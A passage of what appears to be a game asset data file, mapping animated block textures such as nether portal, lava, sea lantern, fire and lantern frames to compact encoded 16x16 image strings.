    "netherPortal12": "0g0g+]b;a)9Sb$;{;a-a{bQb-aESa-aFSbUs(rb)$;sX${)K;IK$s(XQb-{b-a;b$u-=;a-s(-a)90gg8^w5)~SShP*61Vp8Spm0lwX1sN1eE[QUXE*]8XQysdJ0Iro!V^o94%eoUs7-(9JSc7K4O?RAjcgh@$h5#@60J62S91$ph8h06TV",
    "netherPortal13": "0g0g-]b;a-aSar;-aESb)9{b-X{-a-9QbbUs(Sb$s($K;IK$s{be-)aE-$;a-aF)-9;s({));b$;aQbX-a0gg8TA);hhxU<kP41jV?l7R|lE{Mk.g2)=0|r13tg5U0q)abV&[7MB5k;whi~40Qt[ez01:Ic3U:SR20<l|a9~?x7",
    "netherPortal14": "0g0g,rSa;aSb$Us(s(Qb-9-aE)9-$;a-a]b)K${b{{;b$-as($X;a-aFX&-I-9;=)aESbIK;)-as{bu-u-;-0ggwSg)p4SP)~lll)>S?ydc[xpU?Ak@=UsCeT4c?i1x1wfT1-~F8y5Rc9s(hjj@ls@-R]r8wM<;Fce4rx9;P.QX<jw+",
    "netherPortal15": "0g0gOs(;a-aSaQbr-aE-a{b$-9]b;a{Us(){b{;K$K;-Sb$)sI)9X)aE$bXs()-I&Sb-aF;;0gg6c0[wJ(j}gTi|?8T?2s1U>8@h72j&C9Bw^Sj8Sxij<7X43zKo3?sUdk4cJ4S25>k0|T]bsBd?)kR]Kxgxxg^x1RQ]xVlCR75)lt;XKx(ST",
    "netherPortal16": "0g0g+${bQbSb$Us(Qb-a;a$;a-aX))9)aE{]b){b;K$s-aFSbr=SaI-aEbX-;as(;{)K;-s(;&e-0gcT@s^01)(8h?AVXE*%p[PshkjPEQKj<-xT9yzw.p6uEU@]&Bh0Bg(*}x^d)Ci@x_@y4eUQJRBzw5?]A10|bq5!ARdg!P^b",
    "netherPortal17": "0g0g/{{b]bSb$-a-aQb$-ar)s(-9-aE;a{bs(K$bI)&sSb)9)aE{IX;a$-9Us(u-;-;;K;I-aF);b$Qb-0ggw?o5A(M-2BkVke?kx}J?+>.)dE]0j-Bu9kADCwwd5K!.yui-z!KK@&cp.kLs(84c9M9z]!@c9A_}2?!/Go-U0-mI.}Kl>-lIy8?",
    "netherPortal18": "0g0g/){b]bQb-a$;a{;as()Sb-9)9$K$Sb$-aF-aE-au-s{;{b;rXSaI-bUs(I;b$X)aE;-aQbK;s(I=;a0ggh@cIA(ww8~.0hkE{lkF@KAd6U?5gT-8hBggwdPEj!|=A5gM8)wk#3X99a[=xa3G1432RTsBMfA?E0kQ0E4Ibem:3XwUwpgDk83",
    "netherPortal19": "0g0g,)ss(]b-aQbUs(;aK$SaSb$){-aEs({){b;$;Sb)aE${bK;b-aIXr-9Qb-;a)9-aFX;;b$-9&u-0ggc^oa)s3?yVAK|)M7X-aE7d{-fcOo@(qP>t=-_{g@-P$n.pX&FN<%DpuSUk|D0>EiU4yhVIj[{R|M&/iy24si@ENJOg6q7E_Xu*3",
    "netherPortal20": "0g0g*Is(;{b-aESb${Qb$;a$sK$-aFr)9]b;;b$;;a-9-9{b-a)s()bUs(K;XSbQb{-aSa-)aE-X0ggw[E7)jkh5AUkV(?QPl?.Tc,xw8Ig6t4G$MAQ@}d^,9hp#)<l^vX~dblB3sG$sa[+z/5om4-hsEN%QGHzsC!K?ehQ;%RJ",
    "netherPortal21": "0g0gOI{;{b-aF;aK$s($s({b{sQb;aK;]b-a-aSb$-a-9Sb$)9)-9Us(Xr;bX-aE-)&;e-)=I0ggw^$d-h]kcT0?VBl1d0sM^tEEKjpIABxTEimBm[^T@wU1}?P9Q?4oTRJX*EVlk)?1U51xVwsh.iX$di6sOmkSpS?yg",
    "netherPortal22": "0g0g*;]b)aESb$;K$;a${bQb{s(;aSb-s(-aE-aUs(${b-aF);a-9rXQb;b$sXb-a{)9Sa)Ie--au-;0g2cTRowJXsdEXATk8VEBKEptRSwmhwEKERk?oFNKa|[2E)ynwhwRtRCFou9s%2j9R_kBqhT}^?Snccl&X#syl^L?R",
    "netherPortal23": "0g0gLXs(-aE;a{${;]bK$;arQb$SbSb$)s()aE-a{b-aFQb)9{bsUs()K;)-9-a-e-I-X;Sa0ggwJ$k<2h-VE;+p?SkR]^B%lDR2s1oj>t1<kaO.O@TJ+Bu2i}Ain65eaj|l/czyIpiE$alF6FBa&yESuwwa}%~{h",
    "netherPortal24": "0g0gO$-a;a;)Us(QbK;Sb$s(Sbr{;aX)9Sa]b-aF;K${b-aEs($sX;))-9-;b$-Ibu-={{b-a0ggwJ${EF4{-U|5lEn-Vl%cgm8[xsm3?[ldnC5RPcEh56XU5TlX2^eO/7lqP]!d#N4gS+2aP]Tkb@P7kJm$Fg.br3gu+",
    "netherPortal25": "0g0gN&s;aSa){s({b;;aSb$]b$Qb{-a-aFUs(r-aK$s(K;)aE${bX)9-aEI-9)Sb;=-aX;;a0ggs^$d-hAX.OiE5UMl{wKh>|1Fo?4V>tCModVjNz(*}k6>Mk*.)h?wo{3UKw-*Aath*7cMkoAJ.l^5[pk>5",
    "netherPortal26": "0g0g)Xe-K$;a-aK;)Us(rX$Qb;{b]b;Sb${-aE;as(b;b$sQbs($-aSa;){b-aF)9-9I-a){Sb0ggwJ(Td(FkEUUd4@hgFkQlu2|kSS)4@3)NaXP*4+J?rjj,M>z4|^XMb7lo@2M$dn|{Q5i|+41V%c3A!)vhIB",
    "netherPortal27": "0g0gM;&-K$Sb$Sa{]bs(I$-a$Us(r{b-aF;)Qb-as(;aSb;aIs{)9K;u-e-;b${bb)aE);a-9;XX-aE0ggs^$4c;X4?xjVXd-e<QQcM+tQaIV7]V*_XXx]+?c-BE1U6zhUcMId?feQUe4K%hVmd*yGV2u@EMUMrIke;<5OjU.5",
    "netherPortal28": "0g0g+;K$;aSb$$);]bXs(-a;au-{Us({bQb-aE{-abQb-rX-a$su--aF)aE=){bs(;K;SaI-))9I0ggw$?sSU?Mk09<20hUmtS]QJg{60{cpilhsANS8iITi]1AJ)RQ(As4hCNXqI^S=qc9gMx9Ll0hCkzR[.I;gAM?=g*A(SgrDi",
    "netherPortal29": "0g0g*K;)$QbSb${]b;Xs(-9-aQbu-s;a)aEK$;a-a-aE{b{brUs(-aF;s(I$-;b$-)Sa)9XSb-a)9;e-0ggo9Ed-@Tj[*xEVd50>Vgotm^407$cm5*ctOd&Vsedon?l?.RMR,ldFnma+4nem737J6lRtKd}k>s(6sVr(g@t>{",
    "netherPortal30": "0g0g,${X;]bSb$s(Sa{b-aE-a-{;aQb-aSbK;;b$)Us({bK$r);as()9;a)aEu-;)se--9bQb$II-aFX0ggcE48oalkF54U5Mme<nok(7u482hX{hk{4_G5Gm44;Sz@F0>%oT{;4pX#$1UohlA)D1N<iKiF${ib!6dmngQTFh)/1sE+UQ[7Tgb",
    "netherPortal31": "0g0g*{b{Us(]b$;a-aE-a-;$-aSb$)aEsr{I-aF);Sbs(K;K$);a{bQbe-s(-aSa;b$-;-9u-II)90gg6sgJ$}<4??AlhUVF6TXTvCz!]QXXJg2yS8IlXX5wQEa4hqIzeRkgR9F6Tk?;R[x9AtL30fsA8&pa$T[TU_04XS2F#X03cc.@g",
    
    "lava0": "0g0g*ZZYZHWHgYSZHWWW2HYWyY2YHiYHHwYW(ZHNZWYYwY0YZZYHZOWHiZWWZZ(YyZHHH*YYYY0gRcTTo1Ay^EJ)I;1MkTxVK6]5wCDz0>AO89(x^BGP-^0%uIo11]mtxVAq5VMw~#&tMV(mnKIo9*C[(KEM9E)|[KUPl",
    "lava1": "0g0g(YZSZYHNZZ0Y(ZHZWYHWWiYW2HHwYZ2YHWZ(YWWZyZYHH>WYHHWHgYHHwYZZHY0ggsAb(}$M;1<h%w9*eU5$Ow1Tt0zwy$BAz8,-a8N^)iEsBN-gRGwSswdRa43=^x9jUwS0F{a4^w8q<+Ah;S>)-R.^zPEX_gP",
    "lava2": "0g0g#YSZHNZ2YZZgYWWHWYHHHZiYZ0YwYW(YW5WHwYHY(ZWYyZNZWY>WHZHHY2H0gRcT@swP0kzb)p4PkRP*aU5pk2P*S1%p0ikUF8hx4Uv4yv$il!6?{DUgmEtSKT8J4t)EhA.a?pn|M?vU_M%V2pV8@e81T0%$yTME3ViA0U3Sw",
    "lava3": "0g0gCHSZ(Z2YWYZ(YWWWHWYH2HZ0YwYYYyZZwYHH>WiYYNZHWZYgYHYZ0gcT@s@wRX$8)]44k5pkIB)95lk0pimlnB018EMg0g4(m425wi@lQ808og!8~b4RM278,k]kJ9*{ji)J5T08?gw10p{{[|3RQjwy(5gph4jcSKX1*{sx1",
    "lava4": "0g0gyW(YwYWWYHZSZWH2YYZ0YHYgYYHNZiY(ZyZZYHWW2HHwY>WH0ggwKAcM(Mc8wcos<194Xocdipkt?QonKhdcohw_dfwAhp@|-07wgR?jcNmARx@QS)K9pV38OM@MQK%;7lkKxM)N[]g>m|MgsX;]oxkw3(|04oN2F2c",
    "lava5": "0g0gxWwYwYWYHHYSZZ2YNZWW2HZ(Z(YZWiY0YgYYHYHZHyZH>WY0ggc8AwM|oM?kQU1*cd?k8)UX*?plxQ)PTkgXm1omQAlw0Akh)UXw2]wgiK7khA2w5VMP*[SQT@ldSMK|kX9s?(Px(8PwP-}?4xmmoUUMtxmwl00UJ02hw(7",
    "lava6": "0g0gvZwYgYHWWWZSZiY>WW(YYY2Y(ZWNZ2H0YwYYZHHHHHyZW0Q1MB_Kq004NPTpwIow]@x@53R#SJS4dSy6Q1cKXx&glwAtl4)3kdAU]d4a!1I8BJ@V7yo1;by0(RU%1elg0be",
    "lava7": "0g0gwSZgYWZWHWHyZYWYWYZiY(YH0YwYHHZwYY(ZNZ2HH2YHH0R10F0x!8m02^NFcp?X2wo]4<xK6m0>w+](2zTkGhcu(9AlpSnX6l]@3Iy/F~UC6oTB$pw$8d",
    "lava8": "0g0gy(ZgY0Y(YSZwYWY2HHNZZWHYWZZHiYwYHWY>WYWH2YHyZZHY0gg6sQ0)3c)hPM8?Q;lp]d8T10-ggSj|4gcxogTp0|8N5g>0z|J[8B0g04zR~kwm(18(RSX4x[4gS@Gdkgh0zoB4(QKkzEJQ0V%8xJ4zTA8hg20gk[8S4p6B0v",
    "lava9": "0g0gAwY0YHwY(YWYyZHSZ>WWWHWgYWiYYZHHZNZ(ZZWHYY2YHZHYZ0gcx5o90)T;NQ4TQ<4UmQd8(|coAj|<dAgC]gB@l|4;wB~0j|;I4w>R;wB60gr?C~8To4gsQp960)?4<BAj~Awo0af;ihEoAg]x>4hU;wwQ8w;;gQlJpcg5*9.wm",
    "lava10": "0g0gygY0YY(ZZHWW2WWYHwYYZSZYRZyYWHHwYiHHHZRYyHZNYZWY0g00kc^$Q40-054{jk-240VMMkgcg5O2cTQ(g;gdcg(S4ho0w(m0lR40gcT4wSc0d8gTd(c40739>>g8g>4><dK050hNI4kx)cg4hs-p4wt(4g?04g{g)(f538({sp",
    "lava11": "0g0gugY0YYwYZWHZWZRYHHYZ(ZHyH2HwYSZWYHYiHNY2WRZH0Q0cM_KcSTczy5CgX$4jo4xgS5Qxz(40Xhkg=4nj8XF#lgSnj803k(x0g00aMR,F.S2N04P/0BU04IxFu082/XOf3=zi",
    "lava12": "0g0gpgY0YwYSZWWYHZ2HHH(ZWHwYYZYZHYiHyHZ0RwcXF!a(IM11MgX(y4230A_g5I7z5h6&4whdkwg(nc30l$Sh806Q23@8S9tiD]NwEw^y00QEIM02%XxA08?1w42ry3E($o/g?",
    "lava13": "0g0gngY0YwYWWYHZH(ZYHZwYYSZYHZZWHNY0Rwcx]kS8]11sq0Xxrc4230z84{K1/Mq@4whBAw0*yKmLc30dC0]w844y2S.mQKaQ$by^Xq(KoK01C)$J01OE(Xx0B1%42_ChF3Q",
    "lava14": "0g0gmgY0YwYwYWHHZYYWY(ZSZHHYZ2WWZ2H0RxxIp!850K22&o(4xz]@X2Kg$U0Iho1ogMi0aN$Rh!ag?T@R*841(z3[o<S/wbQwb]gIxT02AOo*(%Q4ME)gXx61Xp!03K*<s|g5kg",
    "lava15": "0g0gogY0YwYwYHHWH2WZZYHZSZY(ZWYYyHW2HZ0RxMX{(xc003Qxw5)zh$2ge#0gIgu(E2cogd~i(dURg2Cag6SR841w2pT2ztck*Jo0dA4OS(.6M0Xx16kK0343|io6a",
    "lava16": "0g0gpgY0Y(ZwYHYWyY2HWYZYWHHHwYSZYZRYyHiHZ0RxMpy{0M4x0J1&MXwFTXwEhkSg_w02]Ugp)0QIUg1)ig1g0ag)7x@M84MSq[ATJJT2?l8t*<IVC)c0e)@O]M^S-}gXxgo@K0g07MiqiSgb",
    "lava17": "0g0gvgY0Y(ZwYYWWZyYZwYYZWiHHHYSZHHZZHRZYZRYW2H2W0RxM^A^{0MXx00MQw%KIagg@Awc!(mgp!Jgl2w1*Rg2nal|BdR84(2p@AQT1Wwkz(Kx2%0ER(0NzkMe?0X#g2hlBiK00nhKTi2",
    "lava18": "0g0gvgY0Y(ZwYZZHWWHZSZWZNYYYwYHYRY2HHyH2WHYWHZY0Rx.$08}g10SI18m008]3g0]wXwM-wg$Q~gKgnkE>02c2pR*y02y8m(2SqyMxq;2rhScA.oS3sw0Md@gXgoRhwj0oRthi-|kS2",
    "lava19": "0g0gygY0Y(ZwYWHWZWYHHY2WSZZYwYZHHWNYHRYHyHYH2HWWZRZ0gRcT5o9EN44|-fSi06$28-Q0]0{{38AS4ggw4(Sw314Mlxho08j14o8}Qh{464T|)T(kR410kdQ4jc(gx4TQ1(?{]64(8?Qw8gKS$g>8O{4gcQj1.TI800Qj1Rlh-8?79g]wh",
    
    "seaLantern0": "0g0g_DYnY,ZnHDZDZDZEW-WDY}nHWZZY$WYH;HZbHZWHZWZYJW}7HZWHHWYPW$WZYYZ{YHHWZ;H^7HYWEWHYWY^7WZWHJHWHZZZZYWPHZHY{HWnZ}nY048w01ag8KK>IiEy]NS6U6cNa/[xRXzAc9C{.!kgN6t6]mxR6cgJCXkJCX2mR6P0e$67,PrFCM@(2D=3f_A/mCS*29}/6znw/J01Jz|>wg^",
    "seaLantern1": "0g0g^DZnY}nH,ZnHDY}7HDZDY}nY-WWWYZ$WYW;HYbHZHYZZZYWZHZYYWYJWPWDZ$WZZZY-WYYHH;YWHnZHEWZWZ^7HHHZYHHYPHJHYH{YZ{H^7W04g(Sekw?3ggy]NSX8$c)e4(EgwR2zB{TaV!^3@P^KaP98$6PBS5#!RafCl|xR615{qK6P1k5!LK7/{PpP/2M#wg6Bc%A8C{NJzeck-gxuR{!B^p#QS2",
    "seaLantern2": "0g0gUDZnHnY,ZDZDZWJZZY$WYW{Y;H{YbHZ}nH7HZHZHYYYHYYWZJWYZWZZZHYPWHWY^7W-W;HWHY;W}7HHYYEWZYWZH-W$WHZZ;H}nYWYWHHWWPH}7YDYJHHYZ{H^7H04g(x21ag80wR08(2?bo)4TiCooNAaz8B@NgF0EXO7m%*!U2.J@0%J*!UaJV!Ut44J*Nn*;U0.>A4%Aa]MFy{G$ooI))7n@100^J_P]0T>",
    "seaLantern3": "0g0g|DZnY}nH-W7HDY}nYDZnHDYDZWJZZY;WHW{HYbH7WWYYZHZJWYYWWWYHPZ^7H,Z{YYYYZ;H}7H{HHZ{Y^7WHHEWHZZ-W$WZ;H;WJHWWHPHWYWZYWYWPWnZ04g(Re0S?aiwy]N!$6{N5IgDwR1]Ae<hERa3CB{TEUC%2T#wRak$oeS4!x^k6]75Lk6]2QEU=ak6[kEUkcteER623ER43(_R$-{NKIM?6O7+BJ93%zB_a",
    "seaLantern4": "0g0g^DZnY}nY,ZnHDZDZ}nH-WDYZZZY$WHW;H{YJHZWWZZYJWYWWWPW$WZYZYZY^7H-W{YYZYHWZ;H;HH;YYHWDYZZHHYZHWH7HWYPH}7HY^7WPZnY04g(0a08K3ig[fwQy0XeUco(KC787e/Cvcaz]pDm%y72n%Opcq6cr,c&O8g-EqOucQq82f;gbvk8co(Q0-fu]Rc=uQ",
    "prismarine0": "0g0g5H@DH#ZYR6Y5({Igi|o)c?8^m0wARS^KmAwkb)ii}6R5Cj0j95F0$8SF(Q$2C2(zP004{Nc1X1i",
    "prismarine1": "0g0g5Z&lH#ZHBY5({Igi|o)c?8^m0wARS^KmAwkb)ii}6R5Cj0j95F0$8SF(Q$2C2(zP004{Nc1X1i",
    "prismarine2": "0g0g5qHH#ZHY5({Igi|o)c?8^m0wARS^KmAwkb)ii}6R5Cj0j95F0$8SF(Q$2C2(zP004{Nc1X1i",
    "prismarine3": "0g0g5H}qW#ZY?H5({Igi|o)c?8^m0wARS^KmAwkb)ii}6R5Cj0j95F0$8SF(Q$2C2(zP004{Nc1X1i",
    
    "stonecutterSaw0": "0g0g7000YZZZYY8WW00000000000000000000000000000000000000000000000000000000P00m?y00^MA1Jy5oPiI8_Ec",
    "stonecutterSaw1": "0g0g7000YZZZYY8WW00000000000000000000000000000000000000000000000000000000F00)|m00A1,jP@Sd+^+59",
    "stonecutterSaw2": "0g0g7000YYZZZY8WW0000000000000000000000000000000000000000000000000000000000C00_%S1J9Jic^(c",
    
    fire: "0g0g=000gW0WwWSWwWWWW(WKWHHWWWHwY(ZKWWHWHYW0YSZHWZZZZkYTWHHWHZHW*HH4WgYWwZZWZZZY3ZWYYZAZgYSWYZYY0000000000000000000000000000000000000000gS0024g00000M18gR0000000wKS00000Ec(S00003<4S0000e|>VfE001<tx00S0s01>h{||S1h2|sAg00Spu3sU;w",
    "fire0": "0g0g=000gW0WwWSWwWWWW(WKWHHWWWHwY(ZKWWHWHYW0YSZHWZZZZkYTWHHWHZHW*HH4WgYWwZZWZZZY3ZWYYZAZgYSWYZYY0000000000000000000000000000000000000000gS0024g00000M18gR0000000wKS00000Ec(S00003<4S0000e|>VfE001<tx00S0s01>h{||S1h2|sAg00Spu3sU;w",
    "fire1": "0g0g/0000WgWwWSWKWwW(WWWKWWWWHHW0YSZTWW*YZHgY(ZWYkYYkHW4WYgYWZZZZZHWHAZSW@WHYYZIZYH*HW(ZWHHWZZW0000000000000000000000000000000000000000g0000000000gkK000000TsPA000002()S0000gd?A^o000>{wJ|?0AojS0JJy08sJE00AJPhog00_JS2()03<*PAA&",
    "fire2": "0g0g.0000WgWwWSWWKW(WSWWWWWWHHWH0YHWwZ(ZSZHYZwYKWHHHZZZW(ZgYTWwWHZWWWAZHWH@WYZH4WWHGZZW00000000000000000000000000000000000000000Rcg00000004T@k000000wJ(S000001s-70000y?kP*l$001}<B@p00Q.oS0Ms|k0Kcwa8000)>03cRU-JS08w.q68rT",
    "fire3": "0g0g/000gWwW(WwW0W0WSWKWKWWWWWWHgY(ZHWH0YTWWwZHYYHgYHWwYZH@HZWSWWHZZZHZkYYHYZWGYZH*H3ZSZ4HAZZZWH0000000000000000000000000000000000000000gg000000689Eg000001T4x$500000g}<4wS000)l0j|(VS08x,(00Fkk000ADE)1q$A<Ow0aE/U6*w;bE.0",
    "fire4": "0g0gM0000WgW(WwWWKWWWHHWSWWWH0YgYHKW(ZZYHwWBWWWwYIYZZZkYWY4WYgYWHSZSWZZkHZHYWWH00000000000000000000000000000T4000000000wg000000000h3k000000T4MwJg0000{o<4E004okV001o8)cw00000[t00008ic]x*fJ00{F0S2!DwMAw2CUg10L.cd",
    "fire5": "0g0g*0000WgWwW(WSWWWWSWWWHWHWwZWWYgY3ZIZHwYKWYYH0YHWHkYWZHIYYgYZZZZWZ(ZWHHZY*WHZZHY00000000000000000000000000000R40000000000Rc(00000000x5o9000003gI$dwS000A<2Q000R4z|>Pcg00000z600006]8kDb$K00Ai)-00A_xEMQ2DE2E0n/S",
    "fire6": "0g0gM0000WgW(WSW0WwWSWWWWKWW0YHKW(ZWwWWYYWHHWWWZYHwZHgYHYZZZZHWZkHWGYWHkYIZTW00000000000000000000000000000040000000000RcT2000000kAgg0002oc);K00000iS4000001OkV00001029$w01C^82pS002At;wi026/*Q1tJPAJ|S0PAJSJP%I.Act5oS",
    "fire7": "0g0g%0000WgWwWSWW(WWwWWWWSWHWwZY0YH(ZgYKWWKWSZgYHHHWZZZGYWHHHZYZWkHWWTWwYYZ0000000000000000000000000000004w0000000gg@800000si9E{o0000001|)R00000002~Ti00000101|Rc0005Qs1A5w0035gp(ia1m.)UKS16q;0l3]))8%VSF(Io3t&",
    "fire8": "0g0gO0000WgWwWSWWKW(WWWSWHgYHHHKWWwWWHWYZZZZZYWgYWwYkHWWkYHHYHWTW0YYYHSZHY(ZY4WWZY0000000000000000000000000000018(00000000Qk40000000A00000002(00000001;34000000oQs0000c]0?{(00M{l?@gw00)g0Us)0Bl)0f8R$kS?_80lGAU}(@",
    "fire9": "0g0gO0000WgW(WWKWSWwWWHWWWWWSWHBW?ZW*YHHwWKWHYIYYZHHYH(ZgYWGZY0YSZZZZwZWAZwYgYTWHWW0000000000000000000g0000000002c(00000000QkK00000001A00000000(000000003o400001)N803;g000g5;s000?AVe-00tV$g0EJ(RDw0yX8g08F40il>igSp;3d",
    "fire10": "0g0gL000gW0WwW(WWWKWSWSWwWKWYWZZ0YWWWHkH?ZHwZHHHwY3ZYgYHZZZHWWWYWWTWHZYW(Z0000000000000000004w0000000003gg000000000o000000005oS000000001cg00000000y9001400002Ec180000@(TkA000NV)k00tQsw0i388igw01px0S003h49!0!XS}!>2M04_xmS",
    "fire11": "0g0gL0000WgWwWSWwWW(WW0Y(ZTWwYWKWSW0WWWZYHKWWWHZWHZZZHYWSZWHHwZYHWZZBWAZkHYW000000000000000001800000000003g0000000003o00000000084000000000000000000044wS000004A)80004hMAVls005C;000t4hQ80010019xxR409gSwS0]B0,ar",
    "fire12": "0g0gM0000WgWWwWWHHHW(WWWH(ZWSWKWKWTWgYWSZW*HWWwY0YWHYZZZwWZWHYZ3ZZWwZWkYHIZ4WZZH*Y0000000000000000018(0000000001gw000000000000000000000000000000000S000000002kA00000bo};h40012x)]R8000l00Q0000oS000004M0g0125shqAg00NkhqASAw2K4M-w",
    "fire13": "0g0g%0000WWWWW(WwWHgYHgWwWSW0YHWWY4WSWgYHWKWHwYZZZWwZ@HWYZZHWWkYHBW(Z(ZYAZ0000000000000000004000000000000000000000000000000000000000000008M5og0000007g^k0000jdgX)i0000xh|0010000J{SS0000g01T]U00000S1TmSKKRo000@?k-d?FU-xE{1V16",
    "fire14": "0g0gL000wWSWSW(W0WKWWHWgWWWwYWHWYHKWHY(ZW0YZYHHYHGYHWZZZYgYwZZIZ(ZZZWHW3Z0000000000000000000000000000000000000000000000000004wk00000005o9c500000aob4050000ds0000000Q00000000h]00000000h{(04ak000}clwT|S.?x*[0.o]0By8-ECFuE",
    "fire15": "0g0g(0000WgW(WWWKWwWWWWSWH0YgYSWWWYWwYHSZHHwZWZWZZZWHHZW(ZkHIZY4WYGZAZWZWHH0000000000000000000000000000000000000000g000000000cT@s00000000c^40000002k00000002d-000000003QK000000000$00000000ysiik0jdg00cgJR0.0v@,F<CB0",
    "fire16": "0g0g)0000W(WSWwWgWWwWWWHWgYSWWHSZWHKWWHwYZYWHW0YZZZYYZY@WHZHAZHH*YY(Z*ZWWZZHGZZZWWH0000000000000000000000000000000000000004w000000000k00000001]ox00000001Ew000000001$w000000001>gg000000001541c004K00I)TiJFM0VU.0BV?tnt6E%[B=!ss~-(Bs",
    "fire17": "0g0gL0000WgWwW(WWWWSWWHKWWHWH4HgYWHAZHSZYkHYWZZZwYHwZKWYWHkYWWHHZWgYZZZWZH0000000000000000000000000000g0000000000M1000000004cwS00000000kw000000000@ow000000000280000000000S008000w00x]8hPE{kS0N|-Tjk?0hP*l1!lJM}J1-",
    "fire18": "0g0g+0000WW(WSWwWwWgWWWWWWHHKWWKWWYwY0YwZ4WYBWgYHH?ZHZZZZZZZY@WIYY*YYHZHZYHWAZkHYHZWH(Z0000000000000000000000000000gS000000001800000000003g00000000005o0000000000100000000000000400000000018A(cg00ya$)$703?AVV1%|o.xX_p]r!2ro]80$o|]",
    "fire19": "0g0g;000gW0W(WSWWwWwWW0YWSWKWHHHgYHwYYWWWwZWHTWH*YZZZZHWkH@WWZW(ZWY4WHH4HWZBWHYYSZWZYZgYGYHH0000000000000000000000000000000000000014000000000028000000000000000000000000020000000000>gw80000o]A3sMS00c|-?A1RdVK|4*78RJ0D{5?2us0u||35u",
    "fire20": "0g0g*0000WgWwWWSWWW(WWWHHHSWW(ZHW0Y(ZWWHZZZ4WgYHWTWYWAZ?ZYYkHKWwZgYZYZKWWZZIZYHHHSZH00000000000000000000000000000000000000000000000000000000000000000000000000000180000000>4S5o4g008@E(008h]Vks01E1!=oEk0?o4RFr7lfn&c$",
    "fire21": "0g0g*000gWWwW0WKWKWWWWWHHHHwY0Y*YHTW?ZwW(ZwZYZY*HHgYSW(WZHWWYHYWZZZHWWZZWH(ZgYWAZZH0000000000000000000000000000000000000000000000000000000000000000000000000000018(00000040h?owJ00gy8{)0h]{BRT00+52oPsF0-TcN%e;phNcj|0krp&m{4",
    "fire22": "0g0gM000wW(WwWSWWWWW0YHYWHZgWHSWHHH(ZHHHwYH(ZKWWZSZ0WWWTWW@WZZZZWAZHWWYIZWH000000000000000000000000000000000000000000000000000000000000000000400000000008wkS0000M8T@wJ0ybA})zS1kVw1F0z28]J02]QC]2A=970PA/N0",
    "fire23": "0g0g)0000WgWSWSWwWwWWWWKWHWwYWWgYTWW(ZYYWW0YHHWZHwZKW(WAZYHHgY3ZZZZIZHkYWWHZYWkHZIY00000000000000000000000000000000000000000000000000000000000000000T8gR8w00000g8wJ0iAd-?;0g)-w1PO0N%llcS02oMit1pMwo(1Fa0riTQSiD",
    "fire24": "0g0gM000gW0WwWSWKWwWWKW(WWHHHWHWSWW0YwYHgY(ZYYWWWAZSZYZZZWHHTWYHHZHZYZ*HZWHW00000000000000000000000000000000000000000000000000000000000000000T00g01wJkw1w02)Ew0S00k%*lAx|04}s?xp<x00h0~8*i8101DM?VOS2xbwSb8w8w65y8w8w8mw",
    "fire25": "0g0gM000WgWwWSWwW(WWWWWWWHHWKWHwYKWTWW0YWwZkYWH0W?ZIH(ZSWY(ZZZZWZWHW*ZYIYZYSZHYgY0000000000000000000000000000000000000000000000000000000018(0004kxo00oS0018Ag00o01{wI81;001[S{o*(11{Kt?sw015?7004m;s2m]0//---Ri-----*^",
    "fire26": "0g0gM0000WgW(WWSWKWwWKWWWWHHSWSZWHH0YgYHHZZHWZBWHWgYYAZZZZH*YZ4WZZYZZW(Z(ZWYW000000000000000000000000000000000000000000000000001004004w000XgXs008000>wJI40@$T00?ksdA00cwTggg00M*k|?Q00001EJ-1C7MqPE!FDaEEE#hEE#^^EEEE",
    "fire27": "0g0g,0000WgWwW(WwWWKWSWSWWWHHWH(ZHHHWKWHZZ3ZgYW0YZZZZSZY?ZHZGZIHWHZZwYHWWYWTWHZZHkYYZYIZ000000000000000000000000000000000000000001000000002cM50000w0002g005g(0003cR24Jow0008g0kag000h6E-X00000Tk8(01?mtSa7JU2g/0|rD,",
    "fire28": "0g0g:0000WgWwW(W0WwWWWWKWWKWH0YSWWWHYHHHwZ@WYSZWZZZHY4WZ*YkYIZwYHWSWZWHW(ZIHHgYZZWZHHZZZZWWHWHW00000000000000000000000000000000000000000T0000000008M2000kg00004x0xg000000004^80000sw00000{)sg0000O?ABVK01s027xs/ss$0%ssL,6i,s[*v|",
    "fire29": "0g0g,0000WWgWwW(WKWWSWWHWKW0YwYWWWHYWHYZWZZZHYZHW*HZYBWHHZH?Z*YZYYAZZGZHZZHZWZYIZWHZZH0000000000000000000000000000000000000000gS0000000000wS004000000000000001g1k1000005AkS000016)S|S00Jo016oI|I0-}@oSSN+AoV06&-(s6X;+d[mo",
    "fire30": "0g0g+0000W(WgWwWwWWW0WSWWHKWSWWHwZBWWH(Z(ZHZHZZZZ*YZHHZWYZHHWHZYIZgYWY4WWWWHwYZWkHH0000000000000000000000000000000000000000000000000000000g0000000(0cTS000003oc0000009EA};00TkJP)kU01ntSt5PCq3al.iPCpS1UP1CT+%u~$Pt(",
    "fire31": "0g0gB000wW0W(WWSZSWHHwYYH(Z3Z*HZWWWZWZZZgYHWW(ZWAZkYYW0YZ?ZwZH0000000000000000000000000000000000000000000004000000w00T0000000w0gT0000008TQ4(@00000gs000029k^E4000O8gJ-t001i|z~<?~1jj]VVe;p0++VV~Up?hlVVx;q8]VVcXBVV>VVm",
    
    "soulLantern0": "0g0gb000<lWP@HAZ2Y#$ZzcHYWZZZTBZ1yg000002hw002h0iyx00130kVT00130CG003j0D00000D00130mG003j0iyx00000hh00000qy002h0y!00130y!00000qy00000hh0000000000000",
    "soulLantern1": "0g0ga000<lWP@HAZ2Y#$ZYZZZZZTBZ1yg000002hw002h0iyx00130kVT00130B003j0C00000C00130l003j0iyx00000hh00000py002h0JyF00130JyF00000py00000hh0000000000000",
    "soulLantern2": "0g0ga000<lWP@HAZ2Y#$ZGHZYYTBZ1yg000002hw002h0iyx00130kVT00130B003j0C00000C00130l003j0iyx00000hh00000py002h0JyF00130JyF00000py00000hh0000000000000",
    "lantern0": "0g0gc000<lWP@H>W2WAZWQYCHZHZYTBZ1yg000003Q(002h0iyx00150@G00150,I005l0-00000-00150[I005l0iyx00000hh00000ry002h0y#00150y#00000ry00000hh0000000000000",
    "lantern1": "0g0gd000<lWP@H>W2WAZZ4HmWZHZkHTBZ1yg000003Q(002h0iyx00150@G00150,I005l0-00000-00150_I005l0iyx00000hh00000sy002h0y$00150y$00000sy00000hh0000000000000",
    "lantern2": "0g0gc000<lWP@H>W2WAZZ4H5YZHZTBZ1yg000003Q(002h0iyx00150@G00150,I005l0-00000-00150[I005l0iyx00000hh00000ry002h0y#00150y#00000ry00000hh0000000000000",
    
